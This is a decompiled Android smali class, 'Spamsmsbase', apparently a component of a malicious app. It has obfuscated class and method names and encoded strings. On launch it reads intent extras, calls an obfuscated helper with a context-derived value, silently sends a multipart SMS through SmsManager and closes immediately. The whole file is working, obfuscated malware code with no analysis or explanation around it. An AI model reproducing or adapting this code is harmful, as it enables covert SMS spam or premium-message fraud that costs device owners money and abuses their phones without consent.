.class public Lcompse/refact/st/upsssss/Spamsmsbase;
.super Landroid/app/Activity;


# instance fields
.field fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/serfwefewfwefewef;

.field sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/Spamsmsbase;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v0, Lcompse/refact/st/upsssss/serfwefewfwefewef;

    invoke-direct {v0}, Lcompse/refact/st/upsssss/serfwefewfwefewef;-><init>()V

    iput-object v0, p0, Lcompse/refact/st/upsssss/Spamsmsbase;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/serfwefewfwefewef;

    return-void
.end method


# virtual methods
.method public fsafsdfsfsdfsfsdfsd()V
    .locals 10

    const/4 v2, 0x0

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Spamsmsbase;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v1, ";\u000f8\u00180\u0008q"

    invoke-static {v1}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v3, "&D*Uv"

    invoke-static {v3}, Lcompse/refact/st/upsssss/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "\u0000(\u0019"

    invoke-static {v4}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v4, p0, Lcompse/refact/st/upsssss/Spamsmsbase;->fsafsdfsfsdfsfsdfsd:Lcompse/refact/st/upsssss/serfwefewfwefewef;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v2, v0}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v5, ">N5\u000f\"I\""

    invoke-static {v5}, Lcompse/refact/st/upsssss/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "\nh"

    invoke-static {v6}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v2, v6}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    iget-object v6, p0, Lcompse/refact/st/upsssss/Spamsmsbase;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v8, p0, Lcompse/refact/st/upsssss/Spamsmsbase;->sdfsdfsdfsdf:Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;

    invoke-virtual {v8, p0}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->fsafsdfsfsdfsfsdfsd(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v2, v8}, Ljava/lang/StringBuilder;->insert(ILjava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "]\u0001D<Err\u001fr.\u001a."

    invoke-static {v8}, Lcompse/refact/st/upsssss/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Lcompse/refact/st/upsssss/rthrthrtjrtjrjtdcbcvbc;->zxcvxvsdvsvsvs(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v0, v5}, Lcompse/refact/st/upsssss/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    invoke-virtual {v0, v3}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v3

    new-instance v4, Landroid/content/Intent;

    const-string v5, ")\u0018)\n)\u00104\u0001"

    invoke-static {v5}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/g;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {p0, v2, v4, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v7

    new-instance v4, Landroid/content/Intent;

    const-string v5, "\u0001l\u0001~\u0016d\u001eh\u0004d\u0000d\u0016"

    invoke-static {v5}, Lcompse/refact/st/upsssss/serfwefewfwefewef;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v4, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-static {p0, v2, v4, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v8

    new-instance v4, Ljava/util/ArrayList;

    invoke-direct {v4}, Ljava/util/ArrayList;-><init>()V

    new-instance v5, Ljava/util/ArrayList;

    invoke-direct {v5}, Ljava/util/ArrayList;-><init>()V

    move v6, v2

    :goto_0
    invoke-virtual {v3}, Ljava/util/ArrayList;->size()I

    move-result v9

    if-ge v2, v9, :cond_0

    invoke-virtual {v5, v8}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    add-int/lit8 v2, v6, 0x1

    invoke-virtual {v4, v7}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    move v6, v2

    goto :goto_0

    :cond_0
    const/4 v2, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 0

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Spamsmsbase;->fsafsdfsfsdfsfsdfsd()V

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Spamsmsbase;->finish()V

    return-void
.end method
